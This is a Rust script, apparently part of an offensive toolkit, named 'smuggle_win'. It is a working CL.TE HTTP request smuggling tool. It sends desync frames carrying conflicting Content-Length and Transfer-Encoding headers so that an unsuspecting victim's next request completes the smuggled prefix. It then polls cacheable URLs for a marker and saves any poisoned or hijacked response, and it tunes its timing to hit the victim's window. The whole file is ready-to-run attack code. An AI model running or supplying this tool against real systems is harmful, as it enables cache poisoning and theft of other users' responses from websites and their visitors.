#!/usr/bin/env rust-script
//! name: smuggle_win
//! description: CL.TE desync window harvester - per round it arms an incomplete smuggled request on the front-end, waits a settle window so the victim's own next request completes it, then probes a list of cacheable URLs (each probe both reads a landed poison and, if nobody completed it yet, completes it itself), with a cooldown before the next round so the front-end cache entry expires and the victim's request is a miss again.
//! version: 1.0.0
//! args: <url> --smuggle '<incomplete request>' --check URL [--check URL]... [--marker S] [--rounds N] [--arms N] [--settle-ms N] [--cooldown-ms N] [--path P] [--read-ms N] [--te-line 'Transfer-Encoding: chunked']
//! keywords: smuggling, desync, cl-te, cache, deception, poison, victim, window, harvest, knife
//!
//! ```cargo
//! [dependencies]
//! rustls = { version = "0.23", default-features = false, features = ["ring", "std", "tls12"] }
//! webpki-roots = "0.26"
//! ureq = "2"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::{Duration, Instant};
use url::Url;

const ACTION: &str = "smuggle_win";

fn unescape(s: &str) -> String {
    s.replace("\\r\\n", "\r\n").replace("\\n", "\n").replace("\\r", "\r").replace("\\t", "\t")
}

/// One CL.TE arm frame on its own TCP/TLS connection: POST <path> with both a
/// Content-Length covering `0\r\n\r\n<prefix>` and a Transfer-Encoding line.
fn arm(host: &str, port: u16, tls: bool, path: &str, prefix: &str, te_line: &str, read_ms: u64) -> Result<(String, usize), String> {
    let prefix = unescape(prefix);
    let body = format!("0\r\n\r\n{prefix}");
    let frame = format!(
        "POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: {}\r\n{te_line}\r\n\r\n{body}",
        body.len()
    );
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect: {e}"))?;
    let _ = tcp.set_read_timeout(Some(Duration::from_millis(read_ms.max(300))));
    let mut buf = [0u8; 4096];
    let n;
    if tls {
        let mut roots = rustls::RootCertStore::empty();
        roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
        let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
        let name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("sni: {e}"))?;
        let conn = rustls::ClientConnection::new(Arc::new(config), name).map_err(|e| format!("tls: {e}"))?;
        let mut stream = rustls::StreamOwned::new(conn, tcp);
        stream.write_all(frame.as_bytes()).map_err(|e| format!("write: {e}"))?;
        let _ = stream.flush();
        n = stream.read(&mut buf).unwrap_or(0);
    } else {
        let mut stream = tcp;
        stream.write_all(frame.as_bytes()).map_err(|e| format!("write: {e}"))?;
        let _ = stream.flush();
        n = stream.read(&mut buf).unwrap_or(0);
    }
    let raw = String::from_utf8_lossy(&buf[..n]).to_string();
    let first = raw.lines().next().unwrap_or("").trim_end().to_string();
    Ok((first, n))
}

fn main() {
    let _ = rustls::crypto::ring::default_provider().install_default();
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut url = String::new();
    let mut smuggle = String::new();
    let mut checks: Vec<String> = Vec::new();
    let mut rounds: u64 = 6;
    let mut arms: u64 = 1;
    let mut settle_ms: u64 = 10_000;
    let mut cooldown_ms: u64 = 35_000;
    let mut read_ms: u64 = 2_500;
    let mut path = "/".to_string();
    let mut marker = String::new();
    let mut out = String::new();
    let mut te_line = "Transfer-Encoding: chunked".to_string();
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--smuggle" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    smuggle = v.clone();
                }
            }
            "--check" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    checks.push(v.clone());
                }
            }
            "--rounds" => {
                i += 1;
                rounds = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(rounds);
            }
            "--arms" => {
                i += 1;
                arms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(arms);
            }
            "--settle-ms" => {
                i += 1;
                settle_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(settle_ms);
            }
            "--cooldown-ms" => {
                i += 1;
                cooldown_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(cooldown_ms);
            }
            "--read-ms" => {
                i += 1;
                read_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(read_ms);
            }
            "--path" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    path = v.clone();
                }
            }
            "--marker" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    marker = v.clone();
                }
            }
            "--out" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    out = v.clone();
                }
            }
            "--te-line" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    te_line = unescape(v);
                }
            }
            other if !other.starts_with("--") && url.is_empty() => url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if url.is_empty() || smuggle.is_empty() || checks.is_empty() {
        pi_rust_lib::report::failure(
            ACTION,
            "usage",
            "call as: smuggle_win <url> --smuggle '<incomplete request>' --check <url> [--marker S] [--rounds N] [--arms N] [--settle-ms N] [--cooldown-ms N]",
        );
        return;
    }
    let parsed = Url::parse(&url).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = parsed.host_str().unwrap_or("").to_string();
    let tls = parsed.scheme() == "https";
    let port = parsed.port().unwrap_or(if tls { 443 } else { 80 });
    let deadline: Option<u64> = std::env::var("PI_TIMEOUT_SECS").ok().and_then(|v| v.parse().ok());
    let started = Instant::now();
    let agent = ureq::AgentBuilder::new().timeout(Duration::from_secs(30)).redirects(0).build();

    let mut rounds_out: Vec<Value> = Vec::new();
    let mut hit: Option<Value> = None;
    let mut stopped_early = false;

    for r in 1..=rounds {
        if r > 1 {
            std::thread::sleep(Duration::from_millis(cooldown_ms));
        }
        let mut arm_out: Vec<Value> = Vec::new();
        for a in 1..=arms {
            match arm(&host, port, tls, &path, &smuggle, &te_line, read_ms) {
                Ok((line, bytes)) => arm_out.push(json!({"arm": a, "status_line": line, "bytes": bytes})),
                Err(e) => arm_out.push(json!({"arm": a, "error": e})),
            }
        }
        std::thread::sleep(Duration::from_millis(settle_ms));
        let mut probe_out: Vec<Value> = Vec::new();
        for c in &checks {
            let read = |status: u16, text: String, loc: String, cache: String| -> Value {
                let found = !marker.is_empty() && (text.contains(&marker) || loc.contains(&marker));
                let flat: String = text.chars().filter(|ch| !ch.is_whitespace()).take(300).collect();
                json!({"url": c, "status": status, "len": text.len(), "location": loc, "x_cache": cache, "marker": found, "preview": flat})
            };
            let save = |text: &str| {
                if !out.is_empty() && !marker.is_empty() && text.contains(&marker) {
                    let _ = std::fs::write(&out, text);
                }
            };
            let entry = match agent.get(c).call() {
                Ok(resp) => {
                    let status = resp.status();
                    let loc = resp.header("Location").unwrap_or("").to_string();
                    let cache = resp.header("X-Cache").unwrap_or("").to_string();
                    let text = resp.into_string().unwrap_or_default();
                    save(&text);
                    read(status, text, loc, cache)
                }
                Err(ureq::Error::Status(code, resp)) => {
                    let loc = resp.header("Location").unwrap_or("").to_string();
                    let cache = resp.header("X-Cache").unwrap_or("").to_string();
                    let text = resp.into_string().unwrap_or_default();
                    save(&text);
                    read(code, text, loc, cache)
                }
                Err(e) => json!({"url": c, "error": e.to_string()}),
            };
            if entry.get("marker").and_then(Value::as_bool).unwrap_or(false) {
                hit = Some(json!({"round": r, "probe": entry}));
            }
            probe_out.push(entry);
        }
        rounds_out.push(json!({"round": r, "arms": arm_out, "probes": probe_out}));
        if hit.is_some() {
            break;
        }
        if let Some(d) = deadline {
            if started.elapsed().as_secs() + (cooldown_ms / 1000) + (settle_ms / 1000) + 10 >= d.min(3600) {
                stopped_early = true;
                break;
            }
        }
    }

    let data = json!({
        "url": url,
        "path": path,
        "smuggle": unescape(&smuggle),
        "marker": marker,
        "checks": checks,
        "rounds_run": rounds_out.len(),
        "elapsed_s": started.elapsed().as_secs(),
        "stopped_early": stopped_early,
        "hit": hit,
        "rounds": rounds_out,
    });
    let next = if hit.is_some() {
        "marker found: the smuggled response was attributed to that URL - confirm with a plain fetch and banner_verdict"
    } else {
        "no marker yet: tighten --settle-ms/--cooldown-ms around the victim window, add --arms, or widen --check"
    };
    pi_rust_lib::report::success(ACTION, data, next).unwrap_or(());
}
